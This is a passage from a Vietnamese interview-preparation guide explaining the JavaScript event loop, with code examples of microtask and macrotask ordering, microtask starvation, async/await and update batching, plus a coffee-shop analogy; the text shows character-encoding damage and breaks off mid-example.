‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ    1. Execute Call Stack  ‚îÇ  ‚Üí Ch·∫°y h·∫øt synchronous code
‚îÇ       (synchronous code)  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
           ‚îÇ
           ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  2. Check Microtask Queue ‚îÇ  ‚Üí X·ª≠ l√Ω H·∫æT T·∫§T C·∫¢ microtasks
‚îÇ     - process.nextTick()  ‚îÇ     (bao g·ªìm c·∫£ microtasks m·ªõi t·∫°o)
‚îÇ     - Promise callbacks   ‚îÇ
‚îÇ     - queueMicrotask()    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
           ‚îÇ
           ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   3. Render UI (Browser)  ‚îÇ  ‚Üí Update DOM, paint, reflow
‚îÇ      (if needed)          ‚îÇ     (ch·ªâ browser, kh√¥ng ph·∫£i Node.js)
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
           ‚îÇ
           ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  4. Check Macrotask Queue ‚îÇ  ‚Üí L·∫•y M·ªòT macrotask
‚îÇ     - setTimeout()        ‚îÇ     (ch·ªâ 1 c√°i duy nh·∫•t)
‚îÇ     - setImmediate()      ‚îÇ
‚îÇ     - I/O callbacks       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
           ‚îÇ
           ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   5. Go back to Step 1    ‚îÇ  ‚Üí L·∫∑p l·∫°i v√¥ h·∫°n
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

**üî¢ TH·ª® T·ª∞ ∆ØU TI√äN:**

```
1Ô∏è‚É£ Call Stack (Synchronous code)         - Cao nh·∫•t
2Ô∏è‚É£ process.nextTick() (Node.js)          - R·∫•t cao
3Ô∏è‚É£ Promise microtasks                    - Cao
4Ô∏è‚É£ queueMicrotask()                      - Cao
5Ô∏è‚É£ setTimeout(fn, 0) / setInterval()     - Th·∫•p
6Ô∏è‚É£ setImmediate() (Node.js)              - Th·∫•p h∆°n
7Ô∏è‚É£ I/O operations                        - Th·∫•p nh·∫•t
```

---

**‚úÖ ∆Øu ƒëi·ªÉm c·ªßa c∆° ch·∫ø n√†y:**
- Non-blocking I/O ‚Üí ·ª©ng d·ª•ng responsive
- Kh√¥ng b·ªã ƒë√≥ng bƒÉng khi ch·ªù API/database
- Microtask gi√∫p x·ª≠ l√Ω Promise nhanh h∆°n setTimeout
- UI lu√¥n m∆∞·ª£t m√† v√¨ rendering ƒë∆∞·ª£c ∆∞u ti√™n

**‚ö†Ô∏è Nh∆∞·ª£c ƒëi·ªÉm:**
- **Microtask starvation**: V√¥ h·∫°n microtasks ‚Üí macrotask kh√¥ng ch·∫°y
- **Callback hell**: L·ªìng nhi·ªÅu callbacks ‚Üí kh√≥ ƒë·ªçc
- **Kh√≥ debug**: Th·ª© t·ª± th·ª±c thi ph·ª©c t·∫°p h∆°n synchronous
- **Heavy computation block UI**: V√¨ single-threaded

**Code Example:**

**üîç V√≠ d·ª• 1: Ph√¢n bi·ªát Microtask vs Macrotask**

```typescript
console.log('1: Sync code start'); // NgƒÉn x·∫øp g·ªçi (call stack) th·ª±c thi m√£ ƒë·ªìng b·ªô theo nguy√™n t·∫Øc LIFO; t√°c v·ª• d√†i ch·∫∑n UI.

setTimeout(() => console.log('2: Macrotask 1'), 0); // Ch√∫ gi·∫£i: ‚ë£ Macrotask Queue
setTimeout(() => console.log('3: Macrotask 2'), 0); // Ch√∫ gi·∫£i: ‚ë£ Macrotask Queue

Promise.resolve()
  .then(() => console.log('4: Microtask 1')) // Ch√∫ gi·∫£i: ‚ë° Microtask Queue
  .then(() => console.log('5: Microtask 2')); // Ch√∫ gi·∫£i: ‚ë° Microtask Queue (chained)

Promise.resolve().then(() => {
  console.log('6: Microtask 3');

  // ‚ö†Ô∏è T·∫°o th√™m microtask TRONG microtask
  queueMicrotask(() => console.log('7: Microtask 4'));
});

console.log('8: Sync code end'); // NgƒÉn x·∫øp g·ªçi (call stack) th·ª±c thi m√£ ƒë·ªìng b·ªô theo nguy√™n t·∫Øc LIFO; t√°c v·ª• d√†i ch·∫∑n UI.

/* üéØ OUTPUT (theo th·ª© t·ª± Event Loop):
1: Sync code start          // ‚ë† Call Stack: ƒë·ªìng b·ªô
8: Sync code end            // ‚ë† Call Stack: ƒë·ªìng b·ªô
4: Microtask 1              // ‚ë° ALL Microtasks (x·ª≠ l√Ω H·∫æT)
6: Microtask 3 // Ch√∫ gi·∫£i: ‚ë° ALL Microtasks
7: Microtask 4              // ‚ë° ALL Microtasks (t·∫°o th√™m trong microtask)
5: Microtask 2 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
2: Macrotask 1              // ‚ë£ ONE Macrotask (ch·ªâ l·∫•y 1 c√°i)
3: Macrotask 2              // ‚ë£ ONE Macrotask (chu k·ª≥ Event Loop ti·∫øp theo)

üìã Gi·∫£i th√≠ch t·ª´ng b∆∞·ªõc:
1. Call Stack ch·∫°y h·∫øt code ƒë·ªìng b·ªô (1, 8)
2. Event Loop x·ª≠ l√Ω H·∫æT T·∫§T C·∫¢ microtasks (4, 6, 7, 5)
3. Browser c√≥ th·ªÉ render UI (n·∫øu c·∫ßn)
4. Event Loop l·∫•y M·ªòT macrotask (2)
5. Quay l·∫°i b∆∞·ªõc 1, x·ª≠ l√Ω microtasks r·ªìi l·∫•y macrotask ti·∫øp theo (3)
*/
```

**üîç V√≠ d·ª• 2: Microtask Starvation (ƒê√≥i macrotask)**

```typescript
console.log('Start');

setTimeout(() => {
  console.log('‚ùå Macrotask: T√¥i s·∫Ω KH√îNG BAO GI·ªú ch·∫°y!');
}, 0);

// ‚ö†Ô∏è V√î H·∫†N microtasks - CH·∫∂N t·∫•t c·∫£ macrotasks
function infiniteMicrotasks() {
  Promise.resolve().then(() => {
    console.log('‚úÖ Microtask: Ch·∫°y m√£i kh√¥ng d·ª´ng...');
    infiniteMicrotasks(); // T·∫°o th√™m microtask li√™n t·ª•c
  });
}

infiniteMicrotasks();

/*
‚ö†Ô∏è K·∫æT QU·∫¢:
- "Start" in ra
- Microtask in ra v√¥ h·∫°n l·∫ßn
- setTimeout KH√îNG BAO GI·ªú ch·∫°y v√¨ Event Loop m·∫Øc k·∫πt ·ªü Microtask Queue!

üí° B√†i h·ªçc: Ph·∫£i c·∫©n th·∫≠n khi t·∫°o microtask trong microtask
*/
```

**üîç V√≠ d·ª• 3: Call Stack v·ªõi Async/Await**

```typescript
async function asyncFunction() {
  console.log('2: Inside async - before await');

  await Promise.resolve(); // Ch√∫ gi·∫£i: ‚ö° await t·∫°o microtask

  console.log('5: After await (microtask)');
}

console.log('1: Start');
asyncFunction();
console.log('3: After calling async');

Promise.resolve().then(() => console.log('4: Promise.then (microtask)'));

setTimeout(() => console.log('6: setTimeout (macrotask)'), 0);

/* OUTPUT:
1: Start
2: Inside async - before await
3: After calling async
4: Promise.then (microtask)
5: After await (microtask)
6: setTimeout (macrotask)

üìã Gi·∫£i th√≠ch:
- `await` bi·∫øn code ph√≠a sau th√†nh microtask
- T·∫•t c·∫£ microtasks (4, 5) ch·∫°y tr∆∞·ªõc macrotask (6)
*/
```

**üîç V√≠ d·ª• 4: Th·ª±c T·∫ø trong Trading App**

```typescript
interface OrderUpdate {
  orderId: string;
  status: 'pending' | 'filled';
  price: number;
}

class TradingUI {
  private pendingUpdates: OrderUpdate[] = [];

  // ‚ùå BAD: M·ªói update render ngay (g√¢y lag)
  updateOrderBad(order: OrderUpdate) {
    this.renderOrder(order); // Ch√∫ gi·∫£i: Render ngay l·∫≠p t·ª©c
  }

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Batch updates v·ªõi microtask
  updateOrderGood(order: OrderUpdate) {
    this.pendingUpdates.push(order);

    // queueMicrotask: Batch t·∫•t c·∫£ updates trong c√πng 1 tick
    queueMicrotask(() => {
      if (this.pendingUpdates.length > 0) {
        this.renderBatch(this.pendingUpdates);
        this.pendingUpdates = [];
      }
    });
  }

  private renderOrder(order: OrderUpdate) {
    console.log(`Render single order: ${order.orderId}`);
 // Ch√∫ gi·∫£i: DOM update expensive
  }

  private renderBatch(orders: OrderUpdate[]) {
    console.log(`Render ${orders.length} orders in 1 batch`);
    // DOM update once - HI·ªÜU QU·∫¢ H∆†N!
  }
}

 // Ch√∫ gi·∫£i: Test
const ui = new TradingUI();

// Gi·∫£ s·ª≠ nh·∫≠n 100 updates c√πng l√∫c t·ª´ WebSocket
for (let i = 0; i < 100; i++) {
  ui.updateOrderGood({
    orderId: `ORD-${i}`,
    status: 'filled',
    price: 100 + i,
  });
}

/* üéØ K·∫æT QU·∫¢:
‚ùå updateOrderBad: Render 100 l·∫ßn ‚Üí LAG UI
‚úÖ updateOrderGood: Render 1 l·∫ßn v·ªõi 100 items ‚Üí SMOOTH UI

üí° Microtask gi√∫p batch operations trong c√πng 1 Event Loop tick
*/
```

**Best Practices:**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ DO: S·ª≠ d·ª•ng microtask cho batch operations
class StateManager {
  private updates: Set<() => void> = new Set();
  private scheduled = false;

  scheduleUpdate(callback: () => void) {
    this.updates.add(callback);

    if (!this.scheduled) {
      this.scheduled = true;
      queueMicrotask(() => {
        this.updates.forEach((cb) => cb());
        this.updates.clear();
        this.scheduled = false;
      });
    }
  }
}

 // Ch√∫ gi·∫£i: ‚úÖ DO: S·ª≠ d·ª•ng macrotask cho defer work
function deferExpensiveWork(work: () => void) {
  setTimeout(work, 0); // Ch√∫ gi·∫£i: Ch·∫°y sau khi UI render
}

// ‚ùå DON'T: T·∫°o v√¥ h·∫°n microtasks
function badInfiniteMicrotask() {
  Promise.resolve().then(() => badInfiniteMicrotask()); // CH·∫∂N macrotasks!
}

// ‚úÖ DO: Break v√≤ng l·∫∑p v·ªõi macrotask
function goodDeferWork(count: number) {
  if (count > 0) {
    setTimeout(() => goodDeferWork(count - 1), 0); // Cho ph√©p UI render
  }
}

// ‚úÖ DO: Hi·ªÉu th·ª© t·ª± execution ƒë·ªÉ debug
async function debugEventLoop() {
  console.log('1: Sync');

  queueMicrotask(() => console.log('3: Microtask'));

  await Promise.resolve();
  console.log('4: After await (microtask)');

  setTimeout(() => console.log('5: Macrotask'), 0);

  console.log('2: Sync end');
}
```

**üìã T√≥m t·∫Øt Best Practices:**

1. **Microtask (`Promise`, `queueMicrotask`)**: D√πng cho state updates, batch operations c·∫ßn x·ª≠ l√Ω ngay
2. **Macrotask (`setTimeout`)**: D√πng cho defer work, animations, cho ph√©p UI render gi·ªØa c√°c tasks
3. **Tr√°nh Microtask Starvation**: Kh√¥ng t·∫°o v√¥ h·∫°n microtasks, ph·∫£i c√≥ ƒëi·ªÅu ki·ªán d·ª´ng
4. **Async/await**: Hi·ªÉu r·∫±ng code sau `await` l√† microtask
5. **Debugging**: Lu√¥n nh·ªõ th·ª© t·ª±: `Call Stack ‚Üí All Microtasks ‚Üí Render ‚Üí One Macrotask`

**Common Mistakes:**

```typescript
// ‚ùå MISTAKE 1: Nghƒ© setTimeout(fn, 0) ch·∫°y ngay l·∫≠p t·ª©c
console.log('1');
setTimeout(() => console.log('2'), 0);
console.log('3');
// Output: 1, 3, 2 (KH√îNG ph·∫£i 1, 2, 3!)
// ‚ö†Ô∏è setTimeout l√† macrotask, ch·∫°y sau t·∫•t c·∫£ microtasks

// ‚ùå MISTAKE 2: Qu√™n Promise.then l√† microtask
setTimeout(() => console.log('1: Macro'), 0);
Promise.resolve().then(() => console.log('2: Micro'));
 // Ch√∫ gi·∫£i: Output: 2, 1 (microtask ch·∫°y TR∆Ø·ªöC macrotask!)

 // V√≤ng l·∫∑p s·ª± ki·ªán ƒëi·ªÅu ph·ªëi call stack, microtasks v√† macrotasks; microtasks (v√≠ d·ª•: `Promise.then`) ch·∫°y tr∆∞·ªõc macrotasks (`setTimeout`).
function heavyCalculation() {
  const start = Date.now();
  while (Date.now() - start < 5000) {} // Block 5 gi√¢y!
  console.log('Done');
}

heavyCalculation(); // UI ƒë√≥ng bƒÉng 5 gi√¢y!

// ‚úÖ FIX: Break th√†nh chunks v·ªõi setTimeout
function heavyCalculationFixed(iterations: number, callback: () => void) {
  const chunkSize = 100;
  let current = 0;

  function processChunk() {
    const end = Math.min(current + chunkSize, iterations);

    for (let i = current; i < end; i++) {
 // Ch√∫ gi·∫£i: Do heavy work
    }

    current = end;

    if (current < iterations) {
      setTimeout(processChunk, 0); // Ch√∫ gi·∫£i: Cho UI render
    } else {
      callback();
    }
  }

  processChunk();
}

 // Ch√∫ gi·∫£i: ‚ùå MISTAKE 4: Microtask starvation
let count = 0;
function addMicrotask() {
  if (count++ < 1000000) {
    Promise.resolve().then(addMicrotask); // V√¥ h·∫°n microtasks!
  }
}
addMicrotask(); // Macrotasks b·ªã ch·∫∑n!

// ‚úÖ FIX: Gi·ªõi h·∫°n ho·∫∑c d√πng macrotask
function addMicrotaskFixed() {
  if (count++ < 1000000) {
    setTimeout(() => addMicrotaskFixed(), 0); // Cho ph√©p macrotasks kh√°c ch·∫°y
  }
}
```

**üìã Ch√∫ th√≠ch v·ªÅ c√°c l·ªói th∆∞·ªùng g·∫∑p:**

1. **setTimeout(fn, 0) ‚â† ch·∫°y ngay**: N√≥ l√† macrotask, ch·∫°y sau t·∫•t c·∫£ microtasks v√† code ƒë·ªìng b·ªô
2. **Promise.then ch·∫°y tr∆∞·ªõc setTimeout**: Microtask lu√¥n ∆∞u ti√™n cao h∆°n macrotask
3. **Blocking code l√†m ƒë√≥ng bƒÉng UI**: Ph·∫£i break heavy work th√†nh chunks v·ªõi setTimeout
4. **Microtask starvation**: T·∫°o v√¥ h·∫°n microtasks s·∫Ω ch·∫∑n macrotasks ‚Üí UI kh√¥ng render ƒë∆∞·ª£c

---
---
## 07. üí¨ Q07: Event Loop - Gi·∫£i Th√≠ch Theo C√°ch N√≥i Chuy·ªán ƒê·ªùi Th∆∞·ªùng  

**P1: T√™n c√¢u h·ªèi:** üí¨ Q07: Event Loop - Gi·∫£i Th√≠ch Theo C√°ch N√≥i Chuy·ªán ƒê·ªùi Th∆∞·ªùng  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"Event Loop l√† c∆° ch·∫ø JavaScript x·ª≠ l√Ω async code trong m√¥i tr∆∞·ªùng single-threaded b·∫±ng c√°ch li√™n t·ª•c ki·ªÉm tra Call Stack v√† Task Queues."**

**üîë ·∫®n D·ª• Qu√°n C√† Ph√™ (d·ªÖ nh·ªõ cho ph·ªèng v·∫•n):**

**"Nh∆∞ 1 ng∆∞·ªùi ph·ª•c v·ª• (JS Engine single-thread) l√†m vi·ªác t·∫°i qu·∫ßy (Call Stack). Khi c√≥ vi·ªác l√¢u (async), giao cho m√°y t·ª± ƒë·ªông (Web APIs) r·ªìi ghi t√™n v√†o s·ªï ch·ªù. Li√™n t·ª•c check: ‚ë† Qu·∫ßy tr·ªëng ch∆∞a? ‚ë° C√≥ kh√°ch VIP ch∆∞a? (Microtasks) ‚Üí Ph·ª•c v·ª• h·∫øt VIP tr∆∞·ªõc. ‚ë¢ C√≥ kh√°ch th∆∞·ªùng ch∆∞a? (Macrotasks) ‚Üí Ph·ª•c v·ª• 1 ng∆∞·ªùi. ‚ë£ L·∫∑p l·∫°i."**

**üîë 3 Th√†nh Ph·∫ßn Ch√≠nh:**

**1. Call Stack (Qu·∫ßy pha ch·∫ø):**
- X·ª≠ l√Ω **ƒë·ªìng b·ªô**, t·ª´ng task m·ªôt
- Empty ‚Üí Event Loop m·ªõi ch·∫°y
- Stack overflow khi recursive kh√¥ng c√≥ base case

**2. Task Queues:**
- **Microtask Queue** (VIP): Promise `.then()`, `queueMicrotask()`, MutationObserver
  - **Ch·∫°y h·∫øt t·∫•t c·∫£** tr∆∞·ªõc khi sang Macrotask
- **Macrotask Queue** (th∆∞·ªùng): `setTimeout`, `setInterval`, I/O, UI rendering
  - **Ch·∫°y 1 task** r·ªìi check Microtask l·∫°i

**3. Event Loop:**
- **V√≤ng l·∫∑p v√¥ h·∫°n** ki·ªÉm tra: Call Stack empty ‚Üí Microtasks ‚Üí 1 Macrotask ‚Üí repeat
- ƒê·∫£m b·∫£o UI kh√¥ng b·ªã block (rendering gi·ªØa c√°c macrotasks)

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Nghƒ© `setTimeout(fn, 0)` ch·∫°y ngay ‚Üí Sai! V·∫´n ph·∫£i ch·ªù Call Stack empty + Microtasks xong
- Kh√¥ng hi·ªÉu Microtask **ch·∫°y h·∫øt t·∫•t c·∫£** ‚Üí Promise chains d√†i c√≥ th·ªÉ block UI
- D√πng `setInterval` m√† kh√¥ng clear ‚Üí Memory leak + tasks ch·ªìng ch√©o

**üí° Ki·∫øn Th·ª©c Senior:**
- **Starvation**: Microtask queue d√†i v√¥ h·∫°n (recursive Promise) ‚Üí Macrotasks kh√¥ng bao gi·ªù ch·∫°y ‚Üí UI freeze
- **Rendering timing**: Browser render gi·ªØa macrotasks (60fps = ~16ms/task), n·∫øu task > 16ms ‚Üí jank
- `requestAnimationFrame` ch·∫°y **tr∆∞·ªõc render**, `setTimeout` ch·∫°y sau ‚Üí d√πng rAF cho animation m∆∞·ª£t
- Node.js c√≥ **6 phases** trong Event Loop (timers, I/O, poll, check, close) kh√°c Browser (ch·ªâ c√≥ Micro + Macro)




**üéØ M·ª•c ƒê√≠ch:**

Gi·∫£i th√≠ch Event Loop theo c√°ch d·ªÖ hi·ªÉu nh·∫•t, KH√îNG d√πng thu·∫≠t ng·ªØ technical, gi·ªëng nh∆∞ ƒëang k·ªÉ chuy·ªán cho ng∆∞·ªùi kh√¥ng bi·∫øt l·∫≠p tr√¨nh.


**üìñ C√¢u Chuy·ªán: Qu√°n C√† Ph√™ v√† Ng∆∞·ªùi Ph·ª•c V·ª•**

T∆∞·ªüng t∆∞·ª£ng b·∫°n m·ªü m·ªôt qu√°n c√† ph√™ nh·ªè:

**üè™ SETUP BAN ƒê·∫¶U:**

- **B·∫°n** = JavaScript Engine (ch·ªâ c√≥ 1 ng∆∞·ªùi, l√†m single-threaded)
- **Qu·∫ßy pha ch·∫ø** = Call Stack (ch·ªâ l√†m ƒë∆∞·ª£c 1 vi·ªác t·∫°i 1 th·ªùi ƒëi·ªÉm)
- **Danh s√°ch ch·ªù VIP** = Microtask Queue (∆∞u ti√™n cao - kh√°ch quen, kh√°ch VIP)
- **Danh s√°ch ch·ªù th∆∞·ªùng** = Macrotask Queue (∆∞u ti√™n th·∫•p h∆°n - kh√°ch m·ªõi)
- **B·∫°n ki·ªÉm tra** = Event Loop (li√™n t·ª•c check xem c√≥ vi·ªác g√¨ c·∫ßn l√†m kh√¥ng)

---

**üìã QUY TR√åNH L√ÄM VI·ªÜC:**

**Bu·ªïi s√°ng, qu√°n m·ªõi m·ªü c·ª≠a:**

1. **Kh√°ch A v√†o** ‚Üí g·ªçi "C√† ph√™ ƒëen n√≥ng" (code ƒë·ªìng b·ªô)
   - B·∫°n: "OK, pha ngay!" 
   - ‚Üí B·∫°n pha xong, ƒë∆∞a cho kh√°ch A
   - ‚Üí Kh√°ch A nh·∫≠n v√† ƒëi

2. **Kh√°ch B v√†o** ‚Üí g·ªçi "C√† ph√™ phin" (setTimeout - m·∫•t 5 ph√∫t)
   - B·∫°n: "OK, c√† ph√™ phin ph·∫£i ƒë·ª£i 5 ph√∫t nh√©"
   - ‚Üí B·∫°n ƒë·ªÉ m√°y pha t·ª± ƒë·ªông (Web API)
   - ‚Üí Ghi t√™n Kh√°ch B v√†o **Danh s√°ch ch·ªù th∆∞·ªùng**
   - ‚Üí **KH√îNG ƒë·ª©ng ƒë·ª£i**, l√†m vi·ªác kh√°c ti·∫øp

3. **Kh√°ch C v√†o** ‚Üí g·ªçi "N∆∞·ªõc cam v·∫Øt" (code ƒë·ªìng b·ªô)
   - B·∫°n: "OK, v·∫Øt ngay!"
   - ‚Üí B·∫°n v·∫Øt xong, ƒë∆∞a cho kh√°ch C
   - ‚Üí Kh√°ch C nh·∫≠n v√† ƒëi

4. **Kh√°ch D v√†o** ‚Üí g·ªçi "B√°nh m√¨" v√† h·ª©a s·∫Ω tip (Promise - Microtask)
   - B·∫°n: "OK, kh√°ch tip th√¨ ∆∞u ti√™n cao!"
   - ‚Üí Ghi t√™n Kh√°ch D v√†o **Danh s√°ch ch·ªù VIP**
   - ‚Üí L√†m vi·ªác kh√°c ti·∫øp

5. **Kh√°ch E v√†o** ‚Üí g·ªçi "Tr√† ƒë√°" (code ƒë·ªìng b·ªô)
   - B·∫°n: "OK, pha ngay!"
   - ‚Üí B·∫°n pha xong, ƒë∆∞a cho kh√°ch E

---

**‚è∞ SAU ƒê√ì (Event Loop b·∫Øt ƒë·∫ßu ho·∫°t ƒë·ªông):**

B·∫°n check xem:

**‚ë† Qu·∫ßy pha ch·∫ø c√≥ tr·ªëng kh√¥ng?**
- ‚úÖ Tr·ªëng r·ªìi (Call Stack empty)

**‚ë° C√≥ kh√°ch VIP ch·ªù kh√¥ng? (Microtask Queue)**
- ‚úÖ C√≥! Kh√°ch D (b√°nh m√¨ - kh√°ch tip)
- ‚Üí B·∫°n ph·ª•c v·ª• Kh√°ch D tr∆∞·ªõc (Priority cao!)
- ‚Üí Kh√°ch D nh·∫≠n b√°nh m√¨, ƒëi

**‚ë¢ V·∫´n c√≤n kh√°ch VIP n·ªØa kh√¥ng?**
- ‚ùå Kh√¥ng (Microtask Queue empty)

**‚ë£ C√≥ kh√°ch th∆∞·ªùng ch·ªù kh√¥ng? (Macrotask Queue)**
- ‚úÖ C√≥! Kh√°ch B (c√† ph√™ phin ƒë√£ pha xong sau 5 ph√∫t)
- ‚Üí B·∫°n ƒë∆∞a cho Kh√°ch B
- ‚Üí Kh√°ch B nh·∫≠n, ƒëi

**‚ë§ Quay l·∫°i b∆∞·ªõc ‚ë†** (l·∫∑p l·∫°i m√£i - Event Loop)

---

**üé¨ V√ç D·ª§ C·ª§ TH·ªÇ V·ªöI CODE:**

```javascript
// Kh√°ch A: Code ƒë·ªìng b·ªô
console.log('üë§ Kh√°ch A: C√† ph√™ ƒëen n√≥ng');
// ‚Üí B·∫°n: Pha ngay! ‚òï (th·ª±c hi·ªán ngay l·∫≠p t·ª©c)

// Kh√°ch B: setTimeout (Macrotask - ch·ªù 0ms nh∆∞ng v√†o h√†ng ch·ªù th∆∞·ªùng)
setTimeout(() => {
  console.log('üë§ Kh√°ch B: C√† ph√™ phin (ƒë√£ ch·ªù)');
}, 0);
// ‚Üí B·∫°n: Ghi v√†o danh s√°ch ch·ªù th∆∞·ªùng üìã

// Kh√°ch C: Code ƒë·ªìng b·ªô
console.log('üë§ Kh√°ch C: N∆∞·ªõc cam v·∫Øt');
// ‚Üí B·∫°n: V·∫Øt ngay! üçä

// Kh√°ch D: Promise (Microtask - kh√°ch VIP)
Promise.resolve().then(() => {
  console.log('üë§ Kh√°ch D: B√°nh m√¨ (kh√°ch tip - VIP)');
});
// ‚Üí B·∫°n: Ghi v√†o danh s√°ch VIP ‚≠ê

// Kh√°ch E: Code ƒë·ªìng b·ªô
console.log('üë§ Kh√°ch E: Tr√† ƒë√°');
 // Ch√∫ gi·∫£i: ‚Üí B·∫°n: Pha ngay! üçµ

// ===== K·∫æT QU·∫¢ OUTPUT =====
// üë§ Kh√°ch A: C√† ph√™ ƒëen n√≥ng     ‚Üê ƒê·ªìng b·ªô (ngay l·∫≠p t·ª©c)
// üë§ Kh√°ch C: N∆∞·ªõc cam v·∫Øt         ‚Üê ƒê·ªìng b·ªô (ngay l·∫≠p t·ª©c)
// üë§ Kh√°ch E: Tr√† ƒë√°               ‚Üê ƒê·ªìng b·ªô (ngay l·∫≠p t·ª©c)
// üë§ Kh√°ch D: B√°nh m√¨ (VIP)        ‚Üê Microtask (∆∞u ti√™n cao)
// üë§ Kh√°ch B: C√† ph√™ phin          ‚Üê Macrotask (∆∞u ti√™n th·∫•p)
```

---

**ü§î T·∫†I SAO L·∫†I NH∆Ø V·∫¨Y?**

**C√¢u h·ªèi 1:** T·∫°i sao Kh√°ch B (setTimeout 0ms) kh√¥ng ƒë∆∞·ª£c ph·ª•c v·ª• ngay?
- **Tr·∫£ l·ªùi:** V√¨ Kh√°ch B v√†o **Danh s√°ch ch·ªù th∆∞·ªùng** (Macrotask). D√π ch·ªù 0ms, nh∆∞ng ph·∫£i ƒë·ª£i h·∫øt vi·ªác ƒëang l√†m + kh√°ch VIP m·ªõi ƒë·∫øn l∆∞·ª£t.

**C√¢u h·ªèi 2:** T·∫°i sao Kh√°ch D (Promise) ƒë∆∞·ª£c ph·ª•c v·ª• tr∆∞·ªõc Kh√°ch B?
- **Tr·∫£ l·ªùi:** V√¨ Kh√°ch D l√† **Kh√°ch VIP** (Microtask), c√≥ ∆∞u ti√™n cao h∆°n Kh√°ch th∆∞·ªùng (Macrotask).

**C√¢u h·ªèi 3:** N·∫øu c√≥ 100 kh√°ch VIP li√™n t·ª•c, kh√°ch th∆∞·ªùng c√≥ ƒë∆∞·ª£c ph·ª•c v·ª• kh√¥ng?
- **Tr·∫£ l·ªùi:** KH√îNG! ƒê√¢y g·ªçi l√† **"Microtask Starvation"** (ƒê√≥i kh√°ch th∆∞·ªùng). B·∫°n c·ª© ph·ª•c v·ª• kh√°ch VIP m√£i, kh√°ch th∆∞·ªùng ch·ªù m√£i kh√¥ng t·ªõi l∆∞·ª£t.

---

**üçï V√ç D·ª§ TH·ª∞C T·∫æ: ƒê·∫∂T PIZZA**

```javascript
console.log('üè† T√¥i ƒëang ·ªü nh√†');

// ƒê·∫∑t pizza (setTimeout - Macrotask)
setTimeout(() => {
  console.log('üçï Pizza giao ƒë·∫øn, t√¥i m·ªü c·ª≠a nh·∫≠n');
}, 3000); // 3 gi√¢y sau

console.log('üì∫ T√¥i xem TV trong l√∫c ƒë·ª£i');

// H·ª©a v·ªõi b·∫£n th√¢n (Promise - Microtask)
Promise.resolve().then(() => {
  console.log('üí≠ Nh·∫Øc b·∫£n th√¢n: Nh·ªõ l·∫•y ti·ªÅn tip cho shipper');
});

console.log('üçø T√¥i ƒÉn b·ªèng ng√¥');

 // Ch√∫ gi·∫£i: ===== OUTPUT =====
// üè† T√¥i ƒëang ·ªü nh√†                      ‚Üê Ngay l·∫≠p t·ª©c
